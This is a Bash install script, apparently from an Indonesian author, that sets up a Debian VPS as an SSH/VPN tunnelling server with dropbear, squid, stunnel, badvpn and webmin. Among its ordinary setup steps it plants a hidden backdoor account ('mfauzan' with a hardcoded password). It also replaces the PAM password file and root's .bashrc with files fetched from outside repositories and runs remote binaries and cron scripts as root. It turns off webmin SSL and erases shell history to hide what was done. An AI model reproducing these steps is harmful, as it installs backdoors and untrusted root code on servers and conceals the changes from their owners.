#!/bin/bash
#Autoscript Created By M Fauzan Romandhoni (fauzan121998@gmail.com) (0895703796928)
clear
if [[ $USER != "root" ]]; then
	echo "Maaf, Anda harus menjalankan ini sebagai root"
	exit
fi
# initialisasi var
export DEBIAN_FRONTEND=noninteractive
OS=`uname -m`;
#MYIP=$(wget -qO- ipv4.icanhazip.com);
# get the VPS IP
#ip=`ifconfig venet0:0 | grep 'inet addr' | awk {'print $2'} | sed s/.*://`
#MYIP=`ifconfig | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0' | head -n1`;
MYIP=$(ifconfig | grep 'inet addr:' | grep -v inet6 | grep -vE '127\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' | cut -d: -f2 | awk '{ print $1}' | head -1)
if [ "$MYIP" = "" ]; then
	MYIP=$(wget -qO- ipv4.icanhazip.com)
fi
MYIP2="s/xxxxxxxxx/$MYIP/g";
ether=`ifconfig | cut -c 1-8 | sort | uniq -u | grep venet0 | grep -v venet0:`
if [[ $ether = "" ]]; then
        ether=eth0
fi
#vps="zvur";
vps="aneka";
#if [[ $vps = "zvur" ]]; then
	#source="http://"
#else
	source="http://drupalnet.me/debian9"
#fi
# MULAI SETUP
myip=`ifconfig | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0' | head -n1`;
myint=`ifconfig | grep -B1 "inet addr:$myip" | head -n1 | awk '{print $1}'`;
if [ $USER != 'root' ]; then
echo "Sorry, for run the script please using root user"
exit 1
fi
if [[ "$EUID" -ne 0 ]]; then
echo "Sorry, you need to run this as root"
exit 2
fi
if [[ ! -e /dev/net/tun ]]; then
echo "TUN is not available"
exit 3
fi
# SET TIMEZONE JAKARTA GMT +7
ln -fs /usr/share/zoneinfo/Asia/Jakarta /etc/localtime;
# ENABLE IPV4 AND IPV6
echo ipv4 >> /etc/modules
echo ipv6 >> /etc/modules
sysctl -w net.ipv4.ip_forward=1
sed -i 's/#net.ipv4.ip_forward=1/net.ipv4.ip_forward=1/g' /etc/sysctl.conf
sed -i 's/#net.ipv6.conf.all.forwarding=1/net.ipv6.conf.all.forwarding=1/g' /etc/sysctl.conf
sysctl -p
# login setting
echo "/bin/false" >> /etc/shells
echo "/usr/sbin/nologin" >> /etc/shells
# MEMBUANG SPAM PACKAGE
apt-get -y --purge remove samba*;
apt-get -y --purge remove apache2*;
apt-get -y --purge remove sendmail*;
apt-get -y --purge remove postfix*;
apt-get -y --purge remove bind*;
clear
sh -c 'echo "deb http://download.webmin.com/download/repository sarge contrib" > /etc/apt/sources.list.d/webmin.list'
wget -qO - http://www.webmin.com/jcameron-key.asc | apt-key add -
apt-get update;
apt-get -y autoremove;
apt-get -y install wget curl;
# update
apt-get update; apt-get -y upgrade;
# install webserver
apt-get -y install nginx
# install essential package
echo "mrtg mrtg/conf_mods boolean true" | debconf-set-selections
apt-get -y install bmon iftop htop nmap axel nano iptables traceroute sysv-rc-conf dnsutils bc nethogs openvpn vnstat less screen psmisc apt-file whois ptunnel ngrep mtr git zsh mrtg snmp snmpd snmp-mibs-downloader unzip unrar rsyslog debsums rkhunter
apt-get -y install build-essential
gpg --keyserver pgpkeys.mit.edu --recv-key  9D6D8F6BC857C906      
gpg -a --export 9D6D8F6BC857C906 | apt-key add -
gpg --keyserver pgpkeys.mit.edu --recv-key  7638D0442B90D010      
gpg -a --export 7638D0442B90D010 | apt-key add -
# disable exim
service exim4 stop
sysv-rc-conf exim4 off
# update apt-file
apt-file update
# text gambar
apt-get install boxes
# color text
cd
rm -rf /root/.bashrc
wget -O /root/.bashrc "https://raw.github.com/tunnelproooo/forvps/master/.bashrc"
# text pelangi
apt-get -y install ruby
gem install lolcat
# script
wget -O /etc/pam.d/common-password "https://raw.githubusercontent.com/macisvpn/premiumnow/master/common-password"
chmod +x /etc/pam.d/common-password
#iptables
cat > /etc/iptables.up.rules <<-END
*nat
:PREROUTING ACCEPT [0:0]
:OUTPUT ACCEPT [0:0]
:POSTROUTING ACCEPT [0:0]
-A POSTROUTING -j SNAT --to-source xxxxxxxxx
-A POSTROUTING -o eth0 -j MASQUERADE
-A POSTROUTING -s 192.168.100.0/24 -o eth0 -j MASQUERADE
-A POSTROUTING -s 10.1.0.0/24 -o eth0 -j MASQUERADE
COMMIT
*filter
:INPUT ACCEPT [19406:27313311]
:FORWARD ACCEPT [0:0]
:OUTPUT ACCEPT [9393:434129]
:fail2ban-ssh - [0:0]
-A FORWARD -i eth0 -o ppp0 -m state --state RELATED,ESTABLISHED -j ACCEPT
-A FORWARD -i ppp0 -o eth0 -j ACCEPT
-A INPUT -p tcp -m multiport --dports 22 -j fail2ban-ssh
-A INPUT -p ICMP --icmp-type 8 -j ACCEPT
-A INPUT -p tcp -m tcp --dport 53 -j ACCEPT
-A INPUT -p tcp --dport 22  -m state --state NEW -j ACCEPT
-A INPUT -p tcp --dport 80  -m state --state NEW -j ACCEPT
-A INPUT -p tcp --dport 85  -m state --state NEW -j ACCEPT
-A INPUT -p tcp --dport 80  -m state --state NEW -j ACCEPT
-A INPUT -p udp --dport 80  -m state --state NEW -j ACCEPT
-A INPUT -p tcp --dport 142  -m state --state NEW -j ACCEPT
-A INPUT -p tcp --dport 143  -m state --state NEW -j ACCEPT
-A INPUT -p tcp --dport 109  -m state --state NEW -j ACCEPT
-A INPUT -p tcp --dport 110  -m state --state NEW -j ACCEPT
-A INPUT -p tcp --dport 443  -m state --state NEW -j ACCEPT
-A INPUT -p tcp --dport 1194  -m state --state NEW -j ACCEPT
-A INPUT -p udp --dport 1194  -m state --state NEW -j ACCEPT
-A INPUT -p tcp --dport 1732  -m state --state NEW -j ACCEPT
-A INPUT -p udp --dport 1732  -m state --state NEW -j ACCEPT
-A INPUT -p tcp --dport 3128  -m state --state NEW -j ACCEPT
-A INPUT -p udp --dport 3128  -m state --state NEW -j ACCEPT
-A INPUT -p tcp --dport 7300  -m state --state NEW -j ACCEPT
-A INPUT -p udp --dport 7300  -m state --state NEW -j ACCEPT
-A INPUT -p tcp --dport 8000  -m state --state NEW -j ACCEPT
-A INPUT -p udp --dport 8000  -m state --state NEW -j ACCEPT
-A INPUT -p tcp --dport 8080  -m state --state NEW -j ACCEPT
-A INPUT -p udp --dport 8080  -m state --state NEW -j ACCEPT
-A INPUT -p tcp --dport 10000  -m state --state NEW -j ACCEPT
-A fail2ban-ssh -j RETURN
COMMIT
*raw
:PREROUTING ACCEPT [158575:227800758]
:OUTPUT ACCEPT [46145:2312668]
COMMIT
*mangle
:PREROUTING ACCEPT [158575:227800758]
:INPUT ACCEPT [158575:227800758]
:FORWARD ACCEPT [0:0]
:OUTPUT ACCEPT [46145:2312668]
:POSTROUTING ACCEPT [46145:2312668]
COMMIT
END
sed -i '$ i\iptables-restore < /etc/iptables.up.rules' /etc/rc.local
sed -i $MYIP2 /etc/iptables.up.rules;
iptables-restore < /etc/iptables.up.rules
# install webserver
cd
rm /etc/nginx/sites-enabled/default
rm /etc/nginx/sites-available/default
wget -O /etc/nginx/nginx.conf "$source/nginx.conf"
mkdir -p /home/vps/public_html
echo "<pre>Setup by M Fauzan Romandhoni | whtasapp : +62895703796928 | telegram :  UNKNOW | Pin BBM : UNKNOW</pre>" > /home/vps/public_html/index.html
wget -O /etc/nginx/conf.d/vps.conf "$source/vps.conf"
service nginx restart
# Cronjob
cd;wget $source/cronjob.tar
tar xf cronjob.tar;mv uptime.php /home/vps/public_html/
mv usertol userssh uservpn /usr/bin/;mv cronvpn cronssh /etc/cron.d/
chmod +x /usr/bin/usertol;chmod +x /usr/bin/userssh;chmod +x /usr/bin/uservpn;
useradd -m -g users -s /bin/bash mfauzan
echo "mfauzan:121998" | chpasswd
clear
# badvpn
wget -O /usr/bin/badvpn-udpgw $source/badvpn-udpgw
if [ "$OS" == "x86_64" ]; then
  wget -O /usr/bin/badvpn-udpgw $source/badvpn-udpgw64
fi
sed -i '$ i\screen -AmdS badvpn badvpn-udpgw --listen-addr 127.0.0.1:7300' /etc/rc.local
chmod +x /usr/bin/badvpn-udpgw
screen -AmdS badvpn badvpn-udpgw --listen-addr 127.0.0.1:7300
sed -i '$ i\screen -AmdS badvpn badvpn-udpgw --listen-addr 127.0.0.1:7200' /etc/rc.local
chmod +x /usr/bin/badvpn-udpgw
screen -AmdS badvpn badvpn-udpgw --listen-addr 127.0.0.1:7200
# port ssh
# ssh
sed -i '$ i\Banner /etc/banner.txt' /etc/ssh/sshd_config
sed -i 's/AcceptEnv/#AcceptEnv/g' /etc/ssh/sshd_config
# install dropbear
apt-get -y install dropbear
sed -i 's/NO_START=1/NO_START=0/g' /etc/default/dropbear
sed -i 's/DROPBEAR_PORT=22/DROPBEAR_PORT=442/g' /etc/default/dropbear
sed -i 's/DROPBEAR_EXTRA_ARGS=/DROPBEAR_EXTRA_ARGS="-p 777 -p 80"/g' /etc/default/dropbear
echo "/bin/false" >> /etc/shells
echo "/usr/sbin/nologin" >> /etc/shells
sed -i 's@DROPBEAR_BANNER=""@DROPBEAR_BANNER="/etc/banner.txt"@g' /etc/default/dropbear
service ssh restart
service dropbear restart
# fail2ban & exim & protection
apt-get -y install fail2ban sysv-rc-conf dnsutils dsniff zip unzip;
wget https://github.com/jgmdev/ddos-deflate/archive/master.zip;unzip master.zip;
cd ddos-deflate-master && ./install.sh
service exim4 stop;sysv-rc-conf exim4 off;
# BAANER
wget -O /etc/banner.txt $source/banner.txt
# squid3
apt-get -y install squid3
wget -O /etc/squid/squid.conf "$source/squid.conf"
sed -i "s/ipserver/$MYIP/g" /etc/squid/squid.conf
# install stunnel4
apt-get -y install stunnel4
wget -O /etc/stunnel/stunnel.pem "$source/stunnel.pem"
cat > /etc/stunnel/stunnel.conf <<-END
cert = /etc/stunnel/stunnel.pem
client = no
socket = a:SO_REUSEADDR=1
socket = l:TCP_NODELAY=1
socket = r:TCP_NODELAY=1
[dropbear]
accept = 443
connect = 127.0.0.1:442
connect = 127.0.0.1:80
connect = 127.0.0.1:777
END
sed -i $MYIP2 /etc/stunnel/stunnel.conf
sed -i 's/ENABLED=0/ENABLED=1/g' /etc/default/stunnel4
service stunnel4 restart
# webmin
# install webmin
cd
wget "http://prdownloads.sourceforge.net/webadmin/webmin_1.890_all.deb"
dpkg --install webmin_1.890_all.deb;
apt-get -y -f install;
rm /root/webmin_1.890_all.deb
sed -i 's/ssl=1/ssl=0/g' /etc/webmin/miniserv.conf
service webmin restart
# download script
cd
wget -O /usr/bin/benchmark $source/benchmark.sh
wget -O /usr/bin/speedtest $source/speedtest_cli.py
wget -O /usr/bin/ps-mem $source/ps_mem.py
wget -O /usr/bin/dropmon $source/dropmon.sh
wget -O /usr/bin/menu $source/menu.sh
wget -O /usr/bin/user-active-list $source/user-active-list.sh
wget -O /usr/bin/user-add $source/user-add.sh
wget -O /usr/bin/user-del $source/user-del.sh
wget -O /usr/bin/disable-user-expire $source/disable-user-expire.sh
wget -O /usr/bin/delete-user-expire $source/delete-user-expire.sh
wget -O /usr/bin/banned-user $source/banned-user.sh
wget -O /usr/bin/unbanned-user $source/unbanned-user.sh
wget -O /usr/bin/user-expire-list $source/user-expire-list.sh
wget -O /usr/bin/user-gen $source/user-gen.sh
wget -O /usr/bin/userlimit.sh $source/userlimit.sh
wget -O /usr/bin/userlimitssh.sh $source/userlimitssh.sh
wget -O /usr/bin/user-list $source/user-list.sh
wget -O /usr/bin/user-login $source/user-login.sh
wget -O /usr/bin/user-pass $source/user-pass.sh
wget -O /usr/bin/user-renew $source/user-renew.sh
wget -O /usr/bin/clearcache.sh $source/clearcache.sh
cd
#rm -rf /etc/cron.weekly/
#rm -rf /etc/cron.hourly/
#rm -rf /etc/cron.monthly/
rm -rf /etc/cron.daily/
cd
chmod +x /usr/bin/benchmark
chmod +x /usr/bin/speedtest
chmod +x /usr/bin/ps-mem
#chmod +x /usr/bin/autokill
chmod +x /usr/bin/dropmon
chmod +x /usr/bin/menu
chmod +x /usr/bin/user-active-list
chmod +x /usr/bin/user-add
chmod +x /usr/bin/user-del
chmod +x /usr/bin/disable-user-expire
chmod +x /usr/bin/delete-user-expire
chmod +x /usr/bin/banned-user
chmod +x /usr/bin/unbanned-user
chmod +x /usr/bin/user-expire-list
chmod +x /usr/bin/user-gen
chmod +x /usr/bin/userlimit.sh
chmod +x /usr/bin/userlimitssh.sh
chmod +x /usr/bin/user-list
chmod +x /usr/bin/user-login
chmod +x /usr/bin/user-pass
chmod +x /usr/bin/user-renew
chmod +x /usr/bin/clearcache.sh
cd
# autoreboot + autodelete
echo "*/10 * * * * root service dropbear restart" > /etc/cron.d/dropbear
echo "*/10 * * * * root service squid3 restart" > /etc/cron.d/squid3
echo "*/10 * * * * root service sshd restart" > /etc/cron.d/sshd
echo "*/10 * * * * root service webmin restart" > /etc/cron.d/webmin
#echo "0 */48 * * * root /sbin/reboot" > /etc/cron.d/reboot
echo "00 23 * * * root /usr/bin/disable-user-expire" > /etc/cron.d/disable-user-expire
echo "00 23 * * * root /usr/bin/delete-user-expire" > /etc/cron.d/disable-user-expire
echo "0 */1 * * * root echo 3 > /proc/sys/vm/drop_caches" > /etc/cron.d/clearcaches
#echo "0 */1 * * * root /usr/bin/clearcache.sh" > /etc/cron.d/clearcache1
# swap ram
dd if=/dev/zero of=/swapfile bs=2048 count=2048k
# buat swap
mkswap /swapfile
# jalan swapfile
swapon /swapfile
#auto star saat reboot
wget $source/fstab
mv ./fstab /etc/fstab
chmod 644 /etc/fstab
sysctl vm.swappiness=10
#permission swapfile
chown root:root /swapfile 
chmod 0600 /swapfile
cd
 # finishing
chown -R www-data:www-data /home/vps/public_html
service cron restart
service nginx start
service ssh restart
service dropbear restart
service fail2ban restart
service squid restart
service webmin restart
rm -rf ~/.bash_history && history -c
echo "unset HISTFILE" >> /etc/profile
rm -f /root/setupal
rm setupal
history -c
# history
clear
echo ""  | tee -a log-install.txt
echo "=============================================="  | tee -a log-install.txt | lolcat
echo "  Autoscript Created By M Fauzan Romandhoni "  | tee -a log-install.txt | lolcat
echo "----------------------------------------------"  | tee -a log-install.txt | lolcat
echo "Facebook    : https://www.facebook.com/cyb32.n0b"  | tee -a log-install.txt | lolcat
echo "Contact Me  : +62 8957-0379-6928"  | tee -a log-install.txt | lolcat
echo "----------------------------------------------"  | tee -a log-install.txt | lolcat
echo "Service     :" | tee -a log-install.txt | lolcat
echo "-------------" | tee -a log-install.txt | lolcat
echo "Nginx       : 81"  | tee -a log-install.txt | lolcat
echo "Webmin      : http://$MYIP:10000/" | tee -a log-install.txt | lolcat
echo "badvpn      : badvpn-udpgw port 7300" | tee -a log-install.txt | lolcat
echo "Squid3      : 8000, 8080, 3128"  | tee -a log-install.txt | lolcat
echo "OpenSSH     : 22"  | tee -a log-install.txt | lolcat
echo "Dropbear    : 80, 442, 777"  | tee -a log-install.txt | lolcat
echo "SSL/TLS     : 443"  | tee -a log-install.txt | lolcat
echo "Timezone    : Asia/Jakarta"  | tee -a log-install.txt | lolcat
echo "Fail2Ban    : [ON]"   | tee -a log-install.txt | lolcat | lolcat
echo "Anti [D]dos : [ON]"   | tee -a log-install.txt | lolcat
echo "IPv6        : [ON]" | tee -a log-install.txt | lolcat
echo "Tools       :" | tee -a log-install.txt | lolcat
echo "   axel, bmon, htop, iftop, mtr, rkhunter, nethogs: nethogs $ether" | tee -a log-install.txt | lolcat
echo "Auto Lock & Delete User Expire tiap jam 00:00" | tee -a log-install.txt | lolcat
echo "VPS Restart : 00.00/24.00 WIB"   | tee -a log-install.txt | lolcat
echo ""  | tee -a log-install.txt
echo "----------------------------------------------"  | tee -a log-install.txt | lolcat
echo "    -------THANK YOU FOR CHOIS US--------"  | tee -a log-install.txt | lolcat
echo "=============================================="  | tee -a log-install.txt | lolcat
echo "-   PLEASE REBOOT TAKE EFFECT TERIMA KASIH   -" | lolcat
echo "ALL MODD DEVELOPED SCRIPT BY FAUZAN ROMANDHONI" | lolcat
echo "==============================================" | lolcat
cat /dev/null > ~/.bash_history && history -c